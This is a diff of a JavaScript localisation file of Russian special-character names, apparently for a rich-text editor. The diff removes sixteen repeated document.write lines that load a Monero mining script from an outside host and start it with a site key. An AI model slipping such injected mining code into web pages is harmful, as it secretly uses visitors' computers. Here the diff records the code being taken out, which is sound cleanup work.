@@ -11,19 +11,3 @@ aelig:"Латинская маленькая буква æ",ccedil:"Латинс
 ntilde:"Латинская маленькая буква n с тильдой",ograve:"Латинская маленькая буква o с апострофом",oacute:"Латинская маленькая буква o с ударением",ocirc:"Латинская маленькая буква o с циркумфлексом",otilde:"Латинская маленькая буква o с тильдой",ouml:"Латинская маленькая буква o с тремой",divide:"Знак деления",oslash:"Латинская строчная перечеркнутая o",ugrave:"Латинская маленькая буква u с апострофом",uacute:"Латинская маленькая буква u с ударением",ucirc:"Латинская маленькая буква u с циркумфлексом",
 uuml:"Латинская маленькая буква u с тремой",yacute:"Латинская маленькая буква y с ударением",thorn:"Латинская маленькая буква thorn",yuml:"Латинская маленькая буква y с тремой",OElig:"Латинская прописная лигатура OE",oelig:"Латинская строчная лигатура oe",372:"Латинская заглавная буква W с циркумфлексом",374:"Латинская заглавная буква Y с циркумфлексом",373:"Латинская маленькая буква w с циркумфлексом",375:"Латинская маленькая буква y с циркумфлексом",sbquo:"Нижняя одинарная кавычка",8219:"Правая одинарная кавычка",
 bdquo:"Левая двойная кавычка",hellip:"Горизонтальное многоточие",trade:"Товарный знак",9658:"Черный указатель вправо",bull:"Маркер списка",rarr:"Стрелка вправо",rArr:"Двойная стрелка вправо",hArr:"Двойная стрелка влево-вправо",diams:"Черный ромб",asymp:"Примерно равно"});
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
-document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
